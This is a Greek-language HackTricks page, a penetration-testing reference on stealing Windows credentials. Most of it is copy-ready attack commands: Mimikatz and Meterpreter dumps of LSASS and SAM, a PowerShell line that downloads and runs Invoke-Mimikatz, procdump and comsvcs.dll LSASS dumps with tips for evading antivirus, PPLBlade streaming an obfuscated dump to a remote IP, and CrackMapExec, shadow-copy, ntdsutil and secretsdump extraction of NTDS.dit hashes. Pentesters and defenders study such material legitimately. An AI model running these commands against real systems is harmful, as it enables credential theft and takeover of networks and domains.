# Κλοπή Διαπιστευτηρίων Windows

<details>

<summary><strong>Μάθετε AWS hacking από το μηδέν με</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή **να κατεβάσετε το HackTricks σε PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή την [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Βρείτε άλλα πράγματα που μπορεί να κάνει το Mimikatz σε** [**αυτή τη σελίδα**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Μάθετε για ορισμένες πιθανές προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md) **Αυτές οι προστασίες θα μπορούσαν να αποτρέψουν το Mimikatz από την εξαγωγή ορισμένων διαπιστευτηρίων.**

## Διαπιστευτήρια με Meterpreter

Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** έχω δημιουργήσει για να **αναζητήσετε κωδικούς πρόσβασης και hashes** μέσα στο θύμα.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Παράκαμψη AV

### Procdump + Mimikatz

Καθώς το **Procdump από** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **είναι ένα νόμιμο εργαλείο της Microsoft**, δεν ανιχνεύεται από το Defender.\
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **κάνετε dump τη διαδικασία lsass**, **να κατεβάσετε το dump** και **να εξάγετε** τα **διαπιστευτήρια τοπικά** από το dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}

{% endcode %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Αυτή η διαδικασία γίνεται αυτόματα με το [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Σημείωση**: Κάποια **AV** μπορεί να **ανιχνεύσουν** ως **κακόβουλη** τη χρήση του **procdump.exe για την απόρριψη του lsass.exe**, αυτό συμβαίνει επειδή **ανιχνεύουν** τη συμβολοσειρά **"procdump.exe" και "lsass.exe"**. Έτσι είναι **πιο διακριτικό** να **περάσετε** ως **παράμετρο** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**

### Απόρριψη του lsass με **comsvcs.dll**

Μια DLL με το όνομα **comsvcs.dll** που βρίσκεται στο `C:\Windows\System32` είναι υπεύθυνη για την **απόρριψη της μνήμης της διαδικασίας** σε περίπτωση σφάλματος. Αυτή η DLL περιλαμβάνει μια **συνάρτηση** με το όνομα **`MiniDumpW`**, σχεδιασμένη να καλείται χρησιμοποιώντας το `rundll32.exe`.\
Είναι άσχετο να χρησιμοποιήσετε τα πρώτα δύο επιχειρήματα, αλλά το τρίτο χωρίζεται σε τρία μέρη. Το αναγνωριστικό της διαδικασίας που θα απορριφθεί αποτελεί το πρώτο μέρος, η τοποθεσία του αρχείου απόρριψης αντιπροσωπεύει το δεύτερο, και το τρίτο μέρος είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
Μετά την ανάλυση αυτών των τριών μερών, η DLL εμπλέκεται στη δημιουργία του αρχείου απόρριψης και στη μεταφορά της μνήμης της συγκεκριμένης διαδικασίας σε αυτό το αρχείο.\
Η χρήση της **comsvcs.dll** είναι εφικτή για την απόρριψη της διαδικασίας lsass, εξαλείφοντας έτσι την ανάγκη για μεταφόρτωση και εκτέλεση του procdump. Αυτή η μέθοδος περιγράφεται λεπτομερώς στο [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Η ακόλουθη εντολή χρησιμοποιείται για την εκτέλεση:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία με το** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Απόρριψη του lsass με το Task Manager**

1. Κάντε δεξί κλικ στη γραμμή εργασιών και επιλέξτε Task Manager
2. Κάντε κλικ στο Περισσότερες λεπτομέρειες
3. Αναζητήστε τη διαδικασία "Local Security Authority Process" στην καρτέλα Διαδικασίες
4. Κάντε δεξί κλικ στη διαδικασία "Local Security Authority Process" και επιλέξτε "Create dump file".

### Απόρριψη του lsass με το procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα υπογεγραμμένο από τη Microsoft δυαδικό αρχείο που αποτελεί μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα Εργαλείο Απόρριψης Προστατευμένων Διεργασιών που υποστηρίζει την απόκρυψη της απόρριψης μνήμης και τη μεταφορά της σε απομακρυσμένους σταθμούς εργασίας χωρίς να την αποθηκεύει στον δίσκο.

**Κύριες λειτουργίες**:

1. Παράκαμψη της προστασίας PPL
2. Απόκρυψη των αρχείων απόρριψης μνήμης για να αποφεύγονται οι μηχανισμοί ανίχνευσης με βάση τις υπογραφές του Defender
3. Μεταφόρτωση της απόρριψης μνήμης με μεθόδους μεταφόρτωσης RAW και SMB χωρίς να την αποθηκεύει στον δίσκο (απόρριψη χωρίς αρχείο)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes

### Απόρριψη κατακερματισμών SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Απόρριψη μυστικών LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Απόρριψη του NTDS.dit από τον στόχο DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Απόρριψη του ιστορικού κωδικών πρόσβασης NTDS.dit από τον στόχο DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Εμφάνιση του χαρακτηριστικού pwdLastSet για κάθε λογαριασμό NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Κλοπή SAM & SYSTEM

Αυτά τα αρχεία πρέπει να **βρίσκονται** στο _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Αλλά **δεν μπορείτε απλά να τα αντιγράψετε με κανονικό τρόπο** επειδή είναι προστατευμένα.

### Από το Μητρώο

Ο ευκολότερος τρόπος να κλέψετε αυτά τα αρχεία είναι να πάρετε ένα αντίγραφο από το μητρώο:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Κατεβάστε** αυτά τα αρχεία στη μηχανή Kali σας και **εξαγάγετε τα hashes** χρησιμοποιώντας:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Μπορείτε να κάνετε αντιγραφή προστατευμένων αρχείων χρησιμοποιώντας αυτή την υπηρεσία. Πρέπει να είστε Διαχειριστής.

#### Χρησιμοποιώντας vssadmin

Το vssadmin binary είναι διαθέσιμο μόνο στις εκδόσεις Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Αλλά μπορείτε να κάνετε το ίδιο από **Powershell**. Αυτό είναι ένα παράδειγμα **πώς να αντιγράψετε το αρχείο SAM** (ο σκληρός δίσκος που χρησιμοποιείται είναι "C:" και αποθηκεύεται στο C:\users\Public) αλλά μπορείτε να το χρησιμοποιήσετε για την αντιγραφή οποιουδήποτε προστατευμένου αρχείου:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να κάνετε ένα αντίγραφο των SAM, SYSTEM και ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Το αρχείο **NTDS.dit** είναι γνωστό ως η καρδιά του **Active Directory**, καθώς περιέχει κρίσιμα δεδομένα για αντικείμενα χρηστών, ομάδες και τις συμμετοχές τους. Εδώ αποθηκεύονται οι **κωδικοί πρόσβασης** των χρηστών του τομέα. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στο **_%SystemRoom%/NTDS/ntds.dit_**.

Μέσα σε αυτή τη βάση δεδομένων, διατηρούνται τρεις κύριοι πίνακες:

- **Data Table**: Αυτός ο πίνακας αποθηκεύει λεπτομέρειες για αντικείμενα όπως χρήστες και ομάδες.
- **Link Table**: Παρακολουθεί τις σχέσεις, όπως τις συμμετοχές σε ομάδες.
- **SD Table**: Εδώ αποθηκεύονται οι **περιγραφείς ασφαλείας** για κάθε αντικείμενο, διασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης για τα αποθηκευμένα αντικείμενα.

Περισσότερες πληροφορίες για αυτό: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Τα Windows χρησιμοποιούν _Ntdsa.dll_ για να αλληλεπιδρούν με αυτό το αρχείο και χρησιμοποιείται από το _lsass.exe_. Έτσι, **μέρος** του αρχείου **NTDS.dit** μπορεί να βρίσκεται **μέσα στη μνήμη του `lsass`** (μπορείτε να βρείτε τα τελευταία προσπελασμένα δεδομένα πιθανώς λόγω της βελτίωσης της απόδοσης με τη χρήση μιας **cache**).

#### Αποκρυπτογράφηση των hashes μέσα στο NTDS.dit

Το hash είναι κρυπτογραφημένο 3 φορές:

1. Αποκρυπτογράφηση του Password Encryption Key (**PEK**) χρησιμοποιώντας το **BOOTKEY** και το **RC4**.
2. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας το **PEK** και το **RC4**.
3. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας το **DES**.

Το **PEK** έχει την **ίδια τιμή** σε **κάθε domain controller**, αλλά είναι **κρυπτογραφημένο** μέσα στο αρχείο **NTDS.dit** χρησιμοποιώντας το **BOOTKEY** του **SYSTEM file του domain controller (είναι διαφορετικό μεταξύ των domain controllers)**. Γι' αυτό για να αποκτήσετε τα διαπιστευτήρια από το αρχείο NTDS.dit **χρειάζεστε τα αρχεία NTDS.dit και SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Αντιγραφή του NTDS.dit χρησιμοποιώντας το Ntdsutil

Διαθέσιμο από το Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Μπορείτε επίσης να χρησιμοποιήσετε το κόλπο [**volume shadow copy**](./#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Θυμηθείτε ότι θα χρειαστείτε επίσης ένα αντίγραφο του **SYSTEM file** (πάλι, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).

### **Εξαγωγή hashes από το NTDS.dit**

Μόλις έχετε **αποκτήσει** τα αρχεία **NTDS.dit** και **SYSTEM** μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξάγετε τα hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Μπορείτε επίσης να **εξάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Για **μεγάλα NTDS.dit αρχεία** συνιστάται η εξαγωγή τους χρησιμοποιώντας [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ ή **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων domain από το NTDS.dit σε βάση δεδομένων SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε βάση δεδομένων SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Δεν εξάγονται μόνο τα μυστικά αλλά και ολόκληρα τα αντικείμενα και τα χαρακτηριστικά τους για περαιτέρω εξαγωγή πληροφοριών όταν το ακατέργαστο αρχείο NTDS.dit έχει ήδη ανακτηθεί.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Το `SYSTEM` hive είναι προαιρετικό αλλά επιτρέπει την αποκρυπτογράφηση μυστικών (NT & LM hashes, συμπληρωματικά διαπιστευτήρια όπως κωδικοί σε απλό κείμενο, kerberos ή trust keys, ιστορικά κωδικών NT & LM). Μαζί με άλλες πληροφορίες, εξάγονται τα ακόλουθα δεδομένα: λογαριασμοί χρηστών και μηχανών με τα hashes τους, UAC flags, χρονική σήμανση για την τελευταία σύνδεση και αλλαγή κωδικού, περιγραφή λογαριασμών, ονόματα, UPN, SPN, ομάδες και αναδρομικές συμμετοχές, δέντρο οργανωτικών μονάδων και συμμετοχή, αξιόπιστοι τομείς με τύπο εμπιστοσύνης, κατεύθυνση και χαρακτηριστικά...

## Lazagne

Κατεβάστε το binary από [εδώ](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το binary για να εξάγετε διαπιστευτήρια από διάφορα λογισμικά.
```
lazagne.exe all
```
## Άλλα εργαλεία για εξαγωγή διαπιστευτηρίων από SAM και LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για την εξαγωγή διαπιστευτηρίων από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Κατεβάστε το από: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) και απλά **εκτελέστε το** και οι κωδικοί πρόσβασης θα εξαχθούν.

## Άμυνες

[**Μάθετε για κάποιες προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md)

<details>

<summary><strong>Μάθετε AWS hacking από το μηδέν μέχρι τον ήρωα με</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή **να κατεβάσετε το HackTricks σε PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή την [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
